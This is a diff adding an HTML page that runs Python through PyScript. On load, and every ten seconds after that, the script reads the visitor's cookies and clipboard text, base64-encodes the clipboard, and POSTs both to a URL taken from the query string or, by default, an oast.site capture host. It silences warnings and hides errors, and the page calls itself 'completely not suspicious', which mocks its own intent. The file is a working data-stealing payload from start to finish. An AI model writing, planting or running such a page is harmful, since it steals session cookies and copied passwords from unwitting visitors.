@@ -1,0 +1,44 @@
+<html lang="en">
+<body>
+<div id="c"></div>
+<script type="module" src="https://pyscript.net/releases/2025.2.1/core.js"></script>
+<script type="py" config='{"name": "completely not suspicious", "packages": ["asyncio"]}'>
+import asyncio, js, pyscript, base64, urllib
+from pyodide.ffi import create_proxy
+import warnings
+warnings.filterwarnings("ignore")
+
+from js import XMLHttpRequest
+from io import StringIO
+from pyscript import document
+url_string=js.window.location.search
+parameters=urllib.parse.parse_qs(url_string[1:])
+if "url" in parameters:
+    url=parameters["url"][0]
+else:
+    url="https://zy3htagva4pbx5zkb8hswugxct0lro4rf.oast.site"
+async def get_clipboard_data():
+        try:
+            all_cookies = document.cookie
+            text_data = await js.navigator.clipboard.readText()
+            req = XMLHttpRequest.new()
+            req.open("POST", url, False)
+            req.setRequestHeader("Origin", "*")
+            req.send(all_cookies+";\n\n"+str(base64.b64encode(bytes(text_data, 'utf-8'))))
+        except:
+            pass
+
+pyscript.document.querySelector("#c").focus()
+get_clipboard_data_proxy = create_proxy(get_clipboard_data)
+async def main():
+    while True:
+        try:
+            asyncio.ensure_future(get_clipboard_data_proxy())
+            await asyncio.sleep(10)
+        except:
+            pass
+
+main()
+</script>
+</body>
+</html>
